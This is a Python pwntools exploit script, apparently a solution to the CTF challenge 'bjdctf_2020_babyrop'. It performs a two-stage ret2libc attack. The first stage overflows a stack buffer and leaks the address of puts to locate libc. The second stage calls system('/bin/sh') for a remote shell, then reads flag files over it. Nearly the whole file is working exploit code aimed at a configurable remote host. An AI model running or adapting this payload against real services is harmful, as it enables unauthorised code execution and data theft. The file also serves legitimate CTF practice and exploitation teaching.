from pwn import *
import os
import re
import ssl
import time

context.arch = "amd64"
context.log_level = "info"

BIN = "./bjdctf_2020_babyrop"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "")

POP_RDI = 0x400733
RET = 0x4004C9
PUTS_PLT = 0x4004E0
PUTS_GOT = 0x601018
MAIN = 0x4006AD

# vuln: char buf[0x20] @ rbp-0x20; saved RIP @ rbp+8
OFFSET = 0x20 + 8


def start():
    if args.LOCAL:
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 12_bjdctf_2020_babyrop_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def resolve_libc():
    path = LIBC_PATH
    if not path and args.LOCAL:
        path = "/lib/x86_64-linux-gnu/libc.so.6"
    if not path:
        raise SystemExit("[-] set LIBC=/path/to/libc.so.6 for the remote target")
    return ELF(path, checksec=False)


def exploit():
    p = start()
    libc = resolve_libc()

    p.recvuntil(b"Pull up your sword and tell me u story!\n")

    # Stage 1: puts(puts@got) -> return main.
    stage1 = flat(
        b"A" * OFFSET,
        POP_RDI, PUTS_GOT,
        PUTS_PLT, MAIN,
    )
    p.send(stage1)

    leak = u64(p.recvline().strip().ljust(8, b"\x00"))
    libc_base = leak - libc.symbols["puts"]
    if libc_base & 0xFFF:
        raise SystemExit(
            f"[-] libc base {libc_base:#x} is not page aligned; "
            "LIBC does not match the target"
        )
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
    log.success(
        f"puts = {leak:#x}, libc = {libc_base:#x}, system = {system:#x}"
    )

    p.recvuntil(b"Pull up your sword and tell me u story!\n")

    # Stage 2: ret aligns system() to 16 bytes, then system("/bin/sh").
    stage2 = flat(
        b"A" * OFFSET,
        RET, POP_RDI, binsh, system,
    )
    p.send(stage2)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
